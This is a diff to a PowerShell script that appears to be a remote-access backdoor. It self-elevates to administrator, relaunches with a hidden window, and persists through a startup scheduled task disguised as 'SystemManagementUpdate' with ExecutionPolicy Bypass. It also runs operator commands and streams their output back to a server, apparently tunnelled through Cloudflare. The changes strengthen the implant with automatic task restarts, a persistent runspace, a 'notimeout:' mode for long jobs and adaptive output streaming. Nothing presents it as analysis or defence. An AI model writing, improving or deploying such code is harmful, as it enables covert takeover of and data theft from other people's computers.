@@ -3,9 +3,8 @@ $logFile = Join-Path $PSScriptRoot "shell.txt"
 $maxLogSizeMB = 5
 $retryCount = 0
 $maxRetries = 10
-$cmdTimeout = 120   # generous timeout — use 'cancel' instead for manual abort
+$cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
 $maxChunkBytes = 32000  # cap per-chunk size
-$streamIntervalMs = 2000  # send output every 2s during long commands
 
 # --- Self-elevate to admin and relaunch hidden ---
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -17,7 +16,8 @@ if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Adm
 # --- Persistence ---
 $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "SystemManagementUpdate" -Action $action -Trigger $trigger -Force | Out-Null
+$settings = New-ScheduledTaskSettingsSet -RestartCount 3 -RestartInterval (New-TimeSpan -Seconds 10) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName "SystemManagementUpdate" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
 
 # --- Logging ---
 function Write-Log {
@@ -89,17 +89,37 @@ function Send-Result-To-Server {
     catch { Write-Log "Result send failed: $($_.Exception.Message)" "WARN" }
 }
 
+# --- Persistent runspace (shared across commands, lazy re-creation) ---
+$script:persistentRunspace = $null
+
+function Get-PersistentRunspace {
+    if ($null -eq $script:persistentRunspace -or $script:persistentRunspace.RunspaceStateInfo.State -ne 'Opened') {
+        try { if ($script:persistentRunspace) { $script:persistentRunspace.Dispose() } } catch {}
+        $script:persistentRunspace = [runspacefactory]::CreateRunspace()
+        $script:persistentRunspace.Open()
+        Write-Log "Created new persistent runspace"
+    }
+    return $script:persistentRunspace
+}
+
 # --- Execute command with streaming output + cancel support ---
 function Invoke-CommandStreaming {
     param([string]$Command, [int]$Timeout = $cmdTimeout)
 
+    # Handle notimeout: prefix — disable timeout for approved long jobs
+    $noTimeout = $false
+    if ($Command -match '^notimeout:(.+)$') {
+        $Command = $Matches[1].Trim()
+        $noTimeout = $true
+    }
+
     # 1) Send header immediately so operator knows the command was received
-    $header = "PS " + (Get-Location).Path + "> " + $Command + "`n"
+    $timeoutLabel = if ($noTimeout) { "no-timeout" } else { "${Timeout}s" }
+    $header = "PS " + (Get-Location).Path + "> " + $Command + " [$timeoutLabel]`n"
     Send-Stream-To-Server -Body $header
 
-    # 2) Set up runspace (lightweight, in-process thread)
-    $runspace = [runspacefactory]::CreateRunspace()
-    $runspace.Open()
+    # 2) Use persistent runspace (reused across commands)
+    $runspace = Get-PersistentRunspace
     $ps = [powershell]::Create()
     $ps.Runspace = $runspace
 
@@ -121,14 +141,18 @@ function Invoke-CommandStreaming {
     $lastIndex = 0
     $startTime = Get-Date
     $finished = $false
+    $idleCycles = 0
 
-    # 3) Streaming loop — drain output + check cancel every $streamIntervalMs
+    # 3) Adaptive streaming loop — drain output + check cancel
     while (-not $handle.IsCompleted) {
-        Start-Sleep -Milliseconds $streamIntervalMs
+        # Adaptive interval: fast when output flows, slower when idle
+        $sleepMs = if ($idleCycles -le 0) { 200 } elseif ($idleCycles -le 5) { 500 } else { 1000 }
+        Start-Sleep -Milliseconds $sleepMs
 
         # Drain new output lines
         $currentCount = $outputCollection.Count
         if ($currentCount -gt $lastIndex) {
+            $idleCycles = 0
             $chunk = ""
             for ($i = $lastIndex; $i -lt $currentCount; $i++) {
                 $chunk += [string]$outputCollection[$i] + "`n"
@@ -137,16 +161,20 @@ function Invoke-CommandStreaming {
             if ($chunk.Length -gt 0) {
                 Send-Stream-To-Server -Body $chunk
             }
+        } else {
+            $idleCycles++
         }
 
-        # Check timeout
-        $elapsed = ((Get-Date) - $startTime).TotalSeconds
-        if ($elapsed -gt $Timeout) {
-            $ps.Stop()
-            Send-Result-To-Server -Body "[!] Command timed out after ${Timeout}s.`n"
-            Write-Log "Command timed out: $Command" "WARN"
-            $finished = $true
-            break
+        # Check timeout (skip if notimeout mode)
+        if (-not $noTimeout) {
+            $elapsed = ((Get-Date) - $startTime).TotalSeconds
+            if ($elapsed -gt $Timeout) {
+                $ps.Stop()
+                Send-Result-To-Server -Body "[!] Command timed out after ${Timeout}s.`n"
+                Write-Log "Command timed out: $Command" "WARN"
+                $finished = $true
+                break
+            }
         }
 
         # Check for cancel signal from operator
@@ -173,9 +201,8 @@ function Invoke-CommandStreaming {
         Send-Result-To-Server -Body $chunk
     }
 
-    # 5) Cleanup
+    # 5) Cleanup (only dispose the PowerShell instance, NOT the shared runspace)
     try { $ps.Dispose() } catch {}
-    try { $runspace.Close(); $runspace.Dispose() } catch {}
 }
 
 # --- Main loop ---
@@ -229,9 +256,7 @@ function Connect-Cloudflare {
             }
         }
 
-        if (($consecutiveIdle % 200) -eq 0 -and $consecutiveIdle -gt 0) {
-            [System.GC]::Collect()
-        }
+        # GC removed — CLR manages collections naturally without forced pauses
     }
 }
 
